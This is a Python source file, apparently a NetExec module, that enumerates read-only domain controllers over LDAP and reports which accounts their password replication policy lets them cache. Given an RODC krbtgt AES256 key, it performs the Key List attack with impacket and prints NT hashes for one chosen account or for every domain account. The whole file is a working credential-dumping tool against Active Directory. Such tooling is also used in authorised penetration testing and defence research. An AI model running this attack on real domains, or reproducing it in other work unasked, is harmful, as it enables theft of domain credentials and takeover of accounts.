from binascii import Error as BinasciiError, unhexlify

from impacket.examples.secretsdump import KeyListSecrets
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.ldap import ldapasn1
from impacket.ldap.ldap import escape_filter_chars

from pyasn1.codec.ber import encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type import namedtype, univ

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes

# Technique reference: https://specterops.io/blog/2023/01/25/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc/

ldap_matching_rule_bit_and = "1.2.840.113556.1.4.803"
partial_secrets_account = 0x04000000
rodc_filter = f"(&(objectCategory=computer)(userAccountControl:{ldap_matching_rule_bit_and}:={partial_secrets_account}))"
rodc_attributes = [
    "sAMAccountName",
    "dNSHostName",
    "distinguishedName",
    "msDS-KrbTgtLink",
    "msDS-RevealOnDemandGroup",
    "msDS-NeverRevealGroup",
]
principal_attributes = ["sAMAccountName", "distinguishedName"]
all_principals_filter = "(&(objectClass=user)(sAMAccountName=*))"
cacheability_attribute = "msDS-IsUserCachableAtRodc"
cacheability_attributes = ["distinguishedName", cacheability_attribute]
dn_input_control_oid = "1.2.840.113556.1.4.2026"
rodc_aes256_key_size = 32
policy_fields = (
    ("msDS-RevealOnDemandGroup", "Direct allow policy references", "Allowed"),
    ("msDS-NeverRevealGroup", "Direct deny policy references", "Denied"),
)


class DnInputRequestValue(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType("InputDN", univ.OctetString())
    )


def _as_list(value):
    if value is None:
        return []
    return value if isinstance(value, list) else [value]


def _normalize_dn(value):
    return str(value).strip().casefold()


def _rdn_value(value):
    rdn = str(value).split(",", 1)[0]
    return rdn.split("=", 1)[1] if "=" in rdn else rdn


def _is_cacheable(value):
    return str(value) == "1"


def _dn_input_control(distinguished_name):
    request = DnInputRequestValue()
    request["InputDN"] = distinguished_name.encode("utf-8")

    control = ldapasn1.Control()
    control["controlType"] = dn_input_control_oid
    control["criticality"] = True
    control["controlValue"] = encoder.encode(request)
    return control


class NXCModule:
    name = "rodc-prp"
    description = (
        "Key List Attack for RODC password replication policy"
    )
    supported_protocols = ["ldap"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        RODC    Filter by RODC account name, short hostname, or FQDN
        TARGET  Check sAMAccountName, or use ALL to check every domain account
        RODCKEY AES256 key of the RODC krbtgt_* account; retrieves account NT hash

        Use --verbose flag to show RODC and policy DNs.
        """
        self.option_error = None
        self.rodc = self._option(module_options, "RODC")
        self.target = self._option(module_options, "TARGET")
        self.rodc_key = self._option(module_options, "RODCKEY")
        self.all_targets = self.target is not None and self.target.casefold() == "all"
        if self.rodc_key is not None and self.option_error is None:
            self._validate_rodc_key()

    def _validate_rodc_key(self):
        if self.target is None:
            self.option_error = "RODCKEY requires TARGET"
            return
        try:
            key = unhexlify(self.rodc_key)
        except (BinasciiError, ValueError):
            key = b""
        if len(key) != rodc_aes256_key_size:
            self.option_error = "RODCKEY must be a 64-character AES256 hex key"

    def _option(self, module_options, name):
        if name not in module_options:
            return None
        value = str(module_options[name]).strip()
        if not value and self.option_error is None:
            self.option_error = f"{name} must not be empty"
        return value

    def on_login(self, context, connection):
        if self.option_error:
            context.log.fail(self.option_error)
            return

        response = connection.search(
            searchFilter=rodc_filter, attributes=rodc_attributes
        )
        rodcs = parse_result_attributes(response or [])
        if self.rodc:
            rodcs = [rodc for rodc in rodcs if self._matches_rodc(rodc, self.rodc)]

        if not rodcs:
            qualifier = f" matching {self.rodc}" if self.rodc else ""
            context.log.fail(f"No RODCs found{qualifier}")
            return

        if self.rodc_key and len(rodcs) > 1:
            context.log.fail("RODCKEY is tied to one RODC; select it with RODC=")
            return

        if self.target is None:
            for rodc in rodcs:
                self._report_rodc_overview(
                    context, rodc, self._show_rodc_identity(rodcs, rodc, connection)
                )
            return

        targets = self._resolve_targets(context, connection, rodcs)
        if targets is None:
            return

        reports = self._collect_results(connection, rodcs, targets)
        if reports is None:
            for rodc in rodcs:
                self._report_rodc_overview(
                    context, rodc, self._show_rodc_identity(rodcs, rodc, connection)
                )
            context.log.fail(
                "PRP status unavailable; query the RODC or verify RODC replication rights"
            )
            return

        for rodc, (findings, unavailable) in zip(rodcs, reports, strict=True):
            self._report_rodc(
                context,
                connection,
                rodc,
                findings,
                unavailable,
                len(targets),
                self._show_rodc_identity(rodcs, rodc, connection),
            )

    def _resolve_targets(self, context, connection, rodcs):
        rodc_krbtgt_dns = {
            _normalize_dn(link)
            for rodc in rodcs
            for link in _as_list(rodc.get("msDS-KrbTgtLink"))
        }
        if self.all_targets:
            targets = [
                target
                for target in self._resolve_all_targets(connection)
                if _normalize_dn(target["distinguishedName"]) not in rodc_krbtgt_dns
            ]
            if not targets:
                context.log.fail("No domain accounts found")
                return None
            return targets

        target = self._resolve_target(context, connection)
        if target is None:
            return None
        target_dn = _normalize_dn(target["distinguishedName"])
        if target_dn in rodc_krbtgt_dns:
            target_name = target.get("sAMAccountName", self.target)
            context.log.fail(
                f"{target_name}: RODC krbtgt cacheability is implicit; "
                "Key List is unsupported"
            )
            return None
        return [target]

    def _retrieve_nt_hashes(self, context, connection, rodc, findings):
        links = _as_list(rodc.get("msDS-KrbTgtLink"))
        if len(links) != 1:
            self._report_findings(context, findings)
            context.log.fail("RODC krbtgt link unavailable; cannot retrieve NT hashes")
            return
        krbtgt_name = _rdn_value(links[0])
        try:
            rodc_number = int(krbtgt_name.rsplit("_", 1)[1])
        except (IndexError, ValueError):
            self._report_findings(context, findings)
            context.log.fail(f"RODC krbtgt account {krbtgt_name} has no RODC number")
            return
        domain = connection.targetDomain or connection.domain
        kdc_host = connection.kdcHost
        if not kdc_host:
            self._report_findings(context, findings)
            context.log.fail("No KDC configured; use --kdcHost with a writable DC")
            return

        key_list_secrets = KeyListSecrets(
            domain, kdc_host, rodc_number, self.rodc_key
        )
        for target, result in findings:
            target_name = target.get("sAMAccountName")
            if not target_name:
                continue
            self._report_target(context, target, result)
            if result is not None and not _is_cacheable(result):
                continue
            principal = Principal(
                target_name, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            try:
                partial_tgt, session_key = key_list_secrets.createPartialTGT(principal)
                full_tgt = key_list_secrets.getFullTGT(
                    principal, partial_tgt, session_key
                )
                if full_tgt is None:
                    context.log.fail(
                        f"{target_name}: Key List failed; verify target, RODCKEY, "
                        "writable --kdcHost"
                    )
                    continue
                nt_hash = key_list_secrets.getKey(full_tgt, session_key)[2:]
            except Exception as e:
                context.log.fail(
                    f"{target_name}: Key List failed; verify target, RODCKEY, "
                    "writable --kdcHost"
                )
                if isinstance(e, PyAsn1Error):
                    context.log.info(
                        f"Key List error ({target_name}): KDC response did not "
                        "contain a Key List reply"
                    )
                    context.log.debug(f"Key List decoder error ({target_name}): {e}")
                else:
                    context.log.info(f"Key List error ({target_name}): {e}")
                continue
            context.log.highlight(f"{domain}\\{target_name}:{nt_hash}")

    def _resolve_target(self, context, connection):
        search_filter = (
            f"(&(objectClass=user)(sAMAccountName={escape_filter_chars(self.target)}))"
        )
        response = connection.search(
            searchFilter=search_filter, attributes=principal_attributes
        )
        targets = parse_result_attributes(response or [])
        if not targets:
            context.log.fail(f"Target {self.target} was not found")
            return None
        if len(targets) > 1:
            context.log.fail(
                f"Target {self.target} matched multiple accounts ({len(targets)})"
            )
            return None
        if not targets[0].get("distinguishedName"):
            context.log.fail(f"Target {self.target} has no returned distinguishedName")
            return None
        return targets[0]

    @staticmethod
    def _resolve_all_targets(connection):
        response = connection.search(
            searchFilter=all_principals_filter,
            attributes=principal_attributes,
        )
        return [
            entry
            for entry in parse_result_attributes(response or [])
            if entry.get("sAMAccountName") and entry.get("distinguishedName")
        ]

    @staticmethod
    def _query_target_cacheability(connection, target, rodcs):
        target_dn = target["distinguishedName"]
        base_dn = None
        if len(rodcs) == 1:
            base_dn = rodcs[0].get("distinguishedName")
        response = connection.search(
            searchFilter=rodc_filter,
            attributes=cacheability_attributes,
            baseDN=base_dn,
            searchControls=[_dn_input_control(target_dn)],
        )
        results = {}
        for entry in parse_result_attributes(response or []):
            rodc_dn = entry.get("distinguishedName")
            if rodc_dn:
                results[_normalize_dn(rodc_dn)] = entry.get(cacheability_attribute)
        return results

    def _collect_results(self, connection, rodcs, targets):
        findings = [[] for _ in rodcs]
        unavailable = [0 for _ in rodcs]
        report_uncacheable = self.target is not None and not self.all_targets

        for target_index, target in enumerate(targets):
            results = self._query_target_cacheability(connection, target, rodcs)
            prp_available = any(result is not None for result in results.values())
            # One valid principal is enough to verify access before scanning all accounts.
            if self.all_targets and target_index == 0 and not prp_available:
                return None

            for index, rodc in enumerate(rodcs):
                rodc_dn = rodc.get("distinguishedName")
                result = results.get(_normalize_dn(rodc_dn)) if rodc_dn else None

                if result is None:
                    unavailable[index] += 1
                    if report_uncacheable:
                        findings[index].append((target, result))
                    continue

                if report_uncacheable or _is_cacheable(result):
                    findings[index].append((target, result))

        return list(zip(findings, unavailable, strict=True))

    def _show_rodc_identity(self, rodcs, rodc, connection):
        return len(rodcs) > 1 or not self._matches_rodc(rodc, connection.hostname)

    @staticmethod
    def _matches_rodc(rodc, requested):
        requested = str(requested).casefold()
        account_name = str(rodc.get("sAMAccountName", ""))
        hostname = str(rodc.get("dNSHostName", ""))
        candidates = {
            account_name.casefold(),
            account_name.removesuffix("$").casefold(),
            hostname.casefold(),
            hostname.split(".", 1)[0].casefold(),
        }
        return requested in candidates

    def _report_rodc(
        self,
        context,
        connection,
        rodc,
        findings,
        unavailable,
        target_count,
        show_identity,
    ):
        if not self._report_rodc_overview(context, rodc, show_identity):
            return

        if self.rodc_key:
            self._retrieve_nt_hashes(context, connection, rodc, findings)
        else:
            self._report_findings(context, findings)

        if self.all_targets:
            self._report_unavailable(context, target_count, unavailable)

    def _report_findings(self, context, findings):
        for target, result in findings:
            self._report_target(context, target, result)

    def _report_rodc_overview(self, context, rodc, show_identity):
        account_name = rodc.get("sAMAccountName")
        hostname = rodc.get("dNSHostName")
        distinguished_name = rodc.get("distinguishedName")
        identity = account_name or hostname or distinguished_name
        if not identity:
            context.log.fail("RODC result did not include an identity")
            return False

        if show_identity:
            label = (
                f"{account_name} ({hostname})"
                if account_name and hostname
                else identity
            )
            context.log.display(f"RODC: {label}")
        if distinguished_name:
            context.log.info(f"RODC DN: {distinguished_name}")

        links = _as_list(rodc.get("msDS-KrbTgtLink"))
        if len(links) == 1:
            context.log.highlight(f"RODC krbtgt account: {_rdn_value(links[0])}")
            context.log.info(f"RODC krbtgt DN: {links[0]}")
        else:
            context.log.fail("RODC krbtgt: unavailable")

        for attribute, summary_label, detail_label in policy_fields:
            values = _as_list(rodc.get(attribute))
            context.log.highlight(f"{summary_label}: {len(values)}")
            for value in values:
                context.log.info(f"{detail_label}: {value}")
        return True

    @staticmethod
    def _report_unavailable(context, target_count, unavailable):
        if target_count and unavailable == target_count:
            context.log.fail(
                "PRP status unavailable; query the RODC or verify RODC replication rights"
            )
            return True

        if unavailable:
            account_label = "account" if unavailable == 1 else "accounts"
            context.log.info(
                f"PRP status unavailable for {unavailable} {account_label}; "
                "query the RODC or verify RODC replication rights"
            )
        return False

    @staticmethod
    def _report_target(context, target, result):
        target_name = target.get("sAMAccountName", "<unknown>")
        if result is None:
            context.log.fail(
                f"{target_name}: PRP status unavailable; query the RODC or "
                "verify RODC replication rights"
            )
        elif _is_cacheable(result):
            context.log.success(f"{target_name}: cacheable")
        else:
            context.log.fail(f"{target_name}: not cacheable")
